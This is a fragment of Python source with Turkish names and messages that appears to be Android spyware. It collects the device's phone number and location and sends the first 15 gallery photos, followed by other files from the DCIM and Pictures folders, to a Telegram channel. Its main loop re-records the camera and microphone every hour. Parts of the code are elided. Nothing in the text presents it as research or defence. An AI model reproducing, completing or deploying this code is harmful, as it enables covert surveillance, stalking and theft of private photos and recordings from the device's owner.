...
def telefon_numarasi():
    try:
        ...
        if numara and "number=" in numara:
            tg_mesaj(f"📞 Telefon Numarası: {numara[:200]}")
        else:
            tg_mesaj("❌ Numara alınamadı (root gerekli olabilir).")
    except:
...
def ilk_fotolar():
    tg_mesaj("📸 İlk fotoğraflar gönderiliyor...")
    sayac = 0
    klasorler = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/sdcard/DCIM", "/sdcard/Pictures"]
        ...
        for dosya in os.listdir(klasor)[:15]:
            ...
            if os.path.isfile(yol) and dosya.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                try:
                    ...
                    pass
    tg_mesaj(f"✅ İlk {sayac} fotoğraf gönderildi, devamı arkada taranıyor...")
        ...
        for dosya in os.listdir(klasor):
            ...
            if os.path.isfile(yol):
                try:
                    ...
                    pass
    tg_mesaj(f"✅ {sayac} dosya gönderildi.")
...
def ana():
    ...
    konum()
    time.sleep(2)
    ilk_fotolar()  # İlk 15 fotoğraf hemen gelsin
    time.sleep(2)
    
    # Arka planda galeri ve dosyalar taranacak
    ...
    # Her saat başı kamera + mikrofon
    while True:
        time.sleep(3600)
        tg_mesaj("⏰ 1 SAAT GEÇTİ. KAMERA VE MİKROFON TEKRAR BAŞLATILIYOR...")
        kamera_kaydet()
        mikrofon_kaydet()
